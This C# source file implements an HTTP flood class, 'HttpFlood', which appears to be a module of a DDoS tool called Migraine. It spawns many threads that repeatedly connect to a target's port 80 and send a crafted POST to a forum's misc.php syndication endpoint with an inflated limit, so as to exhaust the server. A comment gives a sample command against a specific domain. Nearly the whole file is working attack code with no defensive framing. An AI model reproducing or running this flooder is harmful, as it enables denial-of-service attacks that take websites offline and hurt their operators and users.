using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace ModuleMigraine
{
    public class HttpFlood : IFloodAttack
    {

        private Thread[] threads;
        private string target;
        private int delay;
        private int startTime;
        private int duration;
        private int threadCount;

        //migraine http-flood pptosn.ga 10 20 200
        public HttpFlood(string target, int threads, int delay, int time)
        {
            this.target = target;
            this.delay = delay;
            this.duration = time;
            this.threadCount = threads;
            this.threads = new Thread[threads];
        }


        public void Start()
        {
            startTime = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;

            for(int i = 0; i < threadCount; i++)
            {
                this.threads[i] = new Thread(flood);
                this.threads[i].IsBackground = true;
                this.threads[i].Start();
            }
        }

        public void Stop()
        {
            for (int i = 0; i < threads.Length; i++)
            {
                if (threads[i].IsAlive)
                {
                    threads[i].Abort();
                }
            }
        }


        private void flood()
        {
            try
            {

                IPHostEntry ipHostInfo = Dns.GetHostEntry(target);
                IPAddress ipAddress = ipHostInfo.AddressList[0];
                IPEndPoint remoteEP = new IPEndPoint(ipAddress, 80);

                string data = "forums%5B%5D=all&version=rss2.0&limit=1500000&make=%D8%AF%D8%B1%DB%8C%D8%A7%D9%81%D8%AA+%D9%84%DB%8C%D9%86%DA%A9+%D9%BE%DB%8C%D9%88%D9%86%D8%AF+%D8%B3%D8%A7%DB%8C%D8%AA%DB%8C";

                string req = "POST /misc.php?action=syndication HTTP/1.1\r\n" + 
                "Accept: * /*\r\n" + 
"Accept-Language: en-gb\r\n" + 
"Content-Type: application/x-www-form-urlencoded\r\n" + 
"Accept-Encoding: gzip, deflate\r\n" + 
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n" +
"Host: " + target + "\r\n" +
"Content-Length: " + data.Length.ToString() +"\r\n" +
"Connection: Keep-Alive\r\n" + 
"Cache-Control: no-cache\r\n\r\n" +
data;

                int currTime = startTime;
                Socket sock;
                while (currTime < startTime + duration)
                {
                    try
                    {
                        sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        sock.NoDelay = true;
                        sock.Connect(remoteEP);
                        sock.Send(Encoding.ASCII.GetBytes(req));

                        Thread.Sleep(delay);
                        currTime = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            catch
            {

            }
        }
    }
}
